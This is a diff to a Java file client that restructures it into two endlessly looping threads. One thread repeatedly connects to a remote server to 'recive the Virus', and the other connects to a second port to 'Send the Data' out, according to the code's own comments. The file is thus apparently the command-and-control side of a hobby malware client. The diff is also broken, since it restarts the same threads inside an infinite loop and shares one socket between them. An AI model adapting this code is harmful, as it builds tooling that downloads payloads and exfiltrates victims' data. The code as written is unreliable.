@@ -45,37 +45,85 @@ public class SimpleFileClient {
 	  
 	  public void ConnectToServer() throws IOException {
 	    
-	   ///***Conect to teh server to recive the Virus***\\\
-	    try {	
-	      sock = new Socket(SERVER, SOCKET_PORT_RECIVE);
-	      System.out.println("Connecting...");
+		  Thread reciveThread = new Thread(new Runnable() {
+			public void run() {
 	
-	      recive.Reciving();
-	      
-	      
-	    }
-	    finally {
-	      if (fos != null) fos.close();
-	      if (bos != null) bos.close();
-	      if (sock != null) sock.close();
-	    }
-	  
+				try {
+					ReciveFile();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}
+		});
+		  
+	   
+	    Thread sendThread = new Thread(new Runnable() {
+			public void run() {
+				
+				try {
+					SendFile();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}
+		});
+	    while (true){
+	    reciveThread.start();
+	    sendThread.start();
 	    
-	    for (long i=0; i<100000; i++)
+	    if (sock != null) sock.close();
 	    
-	///***Conect to teh server to Send the Data***\\\
-	    try {	
-	      sock = new Socket(SERVER, SOCKET_PORT_SEND);
-	      System.out.println("Connecting...");
-	
-	      send.Sending();
-	      
-	    }
-	    finally {
-	      if (fos != null) fos.close();
-	      if (bos != null) bos.close();
-	      if (sock != null) sock.close();
-	    }
 	    
+	    }
 	  }
+	  
+	  
+	  private void ReciveFile() throws IOException, InterruptedException{
+		  while (true){
+			  Thread.sleep(1000);
+		///***Conect to teh server to recive the Virus***\\\
+		    try {	
+		    	sock = new Socket(SERVER, SOCKET_PORT_RECIVE);
+		    	System.out.println("Connecting...");
+		
+		    	recive.Reciving();
+		      
+		      
+		    }
+		    finally {
+		    	if (fos != null) fos.close();
+		    	if (bos != null) bos.close();
+		    	if (sock != null) sock.close();
+		    }
+		  }
+		  
+	  }
+	  
+	  private void SendFile()throws IOException, InterruptedException {
+		while(true){
+		Thread.sleep(1100);
+		///***Conect to teh server to Send the Data***\\\
+			try {	
+				sock = new Socket(SERVER, SOCKET_PORT_SEND);
+				System.out.println("Connecting...");
+		
+				send.Sending();
+		      
+		    }
+		    finally {
+		    	if (fos != null) fos.close();
+		    	if (bos != null) bos.close();
+		    	if (sock != null) sock.close();
+		    }
+		  }
+	  }
+	  
 }
